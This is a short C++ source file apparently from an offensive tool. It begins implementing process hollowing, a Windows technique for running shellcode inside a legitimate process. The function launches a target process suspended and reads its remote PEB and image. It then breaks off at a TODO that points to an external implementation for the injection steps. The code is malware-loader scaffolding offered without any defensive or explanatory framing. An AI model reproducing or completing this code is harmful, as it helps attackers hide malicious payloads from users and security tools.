#include "process_hallowing.h"
#include "pe.h"

void CreateHollowProcess(char *targetPath, const std::vector<BYTE> &shellcode) {
    if (targetPath == nullptr) {
        Print("target path is empty", PRINT_ERROR);
        return;
    }

    if (shellcode.empty()) {
        Print("shellcode vector is empty", PRINT_ERROR);
        return;
    }

    Print("creating process", PRINT_DEBUG);
    auto pStartupInfo = new STARTUPINFOA();
    auto pProcessInfo = new PROCESS_INFORMATION();

    CreateProcessA(0, targetPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
    if (!pProcessInfo->hProcess) {
        Print("failed to create process", PRINT_ERROR);
        return;
    }

    PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
    if (!pPEB) {
        Print("failed to read remote peb", PRINT_ERROR);
        return;
    }

    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
    if (!pImage) {
        Print("failed to read remote image", PRINT_ERROR);
        return;
    }

    // TODO Continue implementation: https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp

    delete pStartupInfo;
    delete pProcessInfo;
    delete pPEB;
    delete pImage;
}